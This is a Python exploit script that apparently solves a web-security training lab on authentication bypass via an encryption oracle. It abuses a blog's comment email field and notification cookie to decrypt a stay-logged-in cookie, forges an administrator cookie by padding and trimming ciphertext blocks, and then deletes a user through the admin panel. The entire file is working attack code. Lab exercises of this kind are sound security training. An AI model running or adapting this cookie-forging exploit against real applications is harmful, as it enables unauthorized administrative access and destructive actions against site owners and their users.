"""
Lab: Authentication bypass via encryption oracle

This script exploits an encryption oracle vulnerability to gain admin access. Steps:

1. Log in as wiener with stay-logged-in cookie enabled
2. Use email parameter to encrypt/decrypt data via encryption oracle
3. Decrypt the stay-logged-in cookie to get the timestamp
4. Create a new admin cookie with proper padding
5. Delete user carlos through admin panel

The encryption oracle works by:
- Using POST /post/comment email parameter to encrypt data
- Using GET /post?postId=1 with notification cookie to decrypt data
- Handling "Invalid email address:" prefix by using 9-char padding
- Removing 32 bytes from encrypted data to get clean cookie

Author: N00BCYB0T
"""

import argparse
import re
from colorama import Fore
from decimal import Decimal, ROUND_HALF_UP
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

URL = None
CSRF_CACHE = {}  # Cache para CSRF tokens

def main():
    global URL

    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://target-lab.com)')
    parser.add_argument('--proxy', help='HTTP Proxy (e.g., http://127.0.0.1:8080)')
    args = parser.parse_args()

    URL = args.url.rstrip('/')
    session = requests.Session()

    if args.proxy:
        session.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    session.verify = False

    # Step 1: Log in as wiener with stay-logged-in enabled
    print(f"{Fore.YELLOW}[*] Logging in as wiener with stay-logged-in...{Fore.RESET}")
    data = {
        "username": "wiener",
        "password": "peter",
        "stay-logged-in": "on"
    }
    login(session, data)

    # Get the stay-logged-in cookie
    stay_logged_in = session.cookies.get("stay-logged-in")
    if not stay_logged_in:
        print(f"{Fore.RED}[-] Failed to get stay-logged-in cookie{Fore.RESET}")
        return

    print(f"{Fore.GREEN}[+] Got stay-logged-in cookie: {stay_logged_in}{Fore.RESET}")

    # Step 2: Decrypt the stay-logged-in cookie
    decrypted = decrypt_data(session, stay_logged_in)
    if not decrypted or ":" not in decrypted:
        print(f"{Fore.RED}[-] Failed to decrypt cookie{Fore.RESET}")
        return

    timestamp = decrypted.split(":")[1]
    print(f"{Fore.GREEN}[+] Decrypted cookie contains timestamp: {timestamp}{Fore.RESET}")

    # Step 3: Create new cookie for administrator
    # Add 9 characters padding + administrator:timestamp to make the prefix block-aligned
    padded_data = "x" * 9 + f"administrator:{timestamp}"
    encrypted = encrypt_data(session, padded_data)
    if not encrypted:
        print(f"{Fore.RED}[-] Failed to encrypt administrator cookie{Fore.RESET}")
        return

    # Step 4: Process the encrypted data to remove the prefix
    import base64
    from urllib.parse import quote, unquote

    # URL decode and base64 decode
    decoded = base64.b64decode(unquote(encrypted))
    # Remove first 32 bytes (accounts for "Invalid email address: " + padding)
    modified = base64.b64encode(decoded[32:]).decode()
    # URL encode for cookie
    admin_cookie = quote(modified)

    print(f"{Fore.GREEN}[+] Created admin cookie: {admin_cookie}{Fore.RESET}")

    # Step 5: Use the admin cookie to access admin panel and delete user
    print(f"{Fore.YELLOW}[*] Accessing admin panel with forged cookie...{Fore.RESET}")
    session.cookies.clear()
    session.cookies.set("stay-logged-in", admin_cookie)

    # Delete user carlos
    response = fetch(session, "/admin/delete?username=carlos")
    
    if "Congratulations, you solved the lab!" in response.text:
        print(f"{Fore.GREEN}[+] Lab solved! Successfully deleted user carlos{Fore.RESET}")
    else:
        print(f"{Fore.RED}[-] Failed to solve the lab{Fore.RESET}")

def fetch(session, path):
    try:
        url = path if path.startswith("http") else f"{URL}{path}"
        return session.get(url, allow_redirects=True)
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to fetch {path}: {e}{Fore.RESET}")
        exit(1)
     
def get_csrf(session, page, force_refresh=False):
    global CSRF_CACHE
    
    if not force_refresh and page in CSRF_CACHE:
        return CSRF_CACHE[page]
    
    response = fetch(session, page)
    match = re.search(r'csrf\" value=\"(.+?)\"', response.text)
    if not match:
        print(f"{Fore.RED}[-] CSRF token not found!{Fore.RESET}")
        exit(1)
    
    token = match.group(1)
    if token != CSRF_CACHE.get(page):  # Só mostra se mudou
        print(f"{Fore.GREEN}[+] Found CSRF Token: {token} | Page: {page}{Fore.RESET}")
    
    CSRF_CACHE[page] = token
    return token

def login(session, data):
    csrf_token = get_csrf(session, "/login")
    data['csrf'] = csrf_token
    try:
        response = session.post(f"{URL}/login", data=data, allow_redirects=True)
        # Verify we're logged in by checking for stay-logged-in cookie
        if not session.cookies.get("stay-logged-in"):
            print(f"{Fore.RED}[!] Failed to get stay-logged-in cookie{Fore.RESET}")
            exit(1)
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to login: {e}{Fore.RESET}")
        exit(1)

def get_notification_cookie(response):
    """Extract notification cookie from response headers"""
    cookies = response.headers.get("Set-Cookie", "").split(", ")
    for cookie in cookies:
        if "notification=" in cookie:
            # Extract everything between notification= and the next ; or end of string
            value = re.search(r'notification=([^;]+)', cookie)
            if value:
                return value.group(1)
    return None

def encrypt_data(session, data):
    """Use email parameter to encrypt data"""
    print(f"{Fore.YELLOW}[*] Encrypting: {data}{Fore.RESET}")
    
    # Get fresh CSRF token
    session.get(f"{URL}/post?postId=1")
    csrf_token = get_csrf(session, "/post?postId=1")
    
    # Submit comment with the data we want to encrypt
    response = session.post(
        f"{URL}/post/comment",
        data={
            "csrf": csrf_token,
            "postId": "1",
            "comment": "test",
            "name": "test",
            "email": data
        },
        allow_redirects=False
    )
    
    # Get notification cookie from the response
    notification = get_notification_cookie(response)
    if notification:
        print(f"{Fore.GREEN}[+] Got encrypted cookie{Fore.RESET}")
        return notification
    
    print(f"{Fore.RED}[-] Failed to get notification cookie{Fore.RESET}")
    return None

def decrypt_data(session, encrypted):
    """Use notification cookie to decrypt data"""
    print(f"{Fore.YELLOW}[*] Decrypting cookie...{Fore.RESET}")
    
    # Make GET request with the stay-logged-in cookie as notification cookie
    response = session.get(
        f"{URL}/post?postId=1",
        cookies={
            "notification": encrypted,  # Use the stay-logged-in cookie here
            "session": session.cookies.get("session")
        }
    )
    
    # First check for wiener:timestamp format (decrypted stay-logged-in cookie)
    match = re.search(r'wiener:(\d+)', response.text)
    if match:
        decrypted = match.group(0)  # Get the full match
        print(f"{Fore.GREEN}[+] Successfully decrypted cookie: {decrypted}{Fore.RESET}")
        return decrypted
        
    # If that didn't work, check for general error message format
    match = re.search(r'Invalid email address: (.*?)(?=<|$)', response.text, re.DOTALL)
    if match:
        decrypted = match.group(1).strip()
        print(f"{Fore.GREEN}[+] Got error message: {decrypted}{Fore.RESET}")
        return decrypted
    
    # If no match found, print response text for debugging
    print(f"{Fore.RED}[-] No error message found in response. Response text:{Fore.RESET}")
    print(response.text[:200] + "...")  # Print first 200 chars of response
    return None

if __name__ == "__main__":
    main()
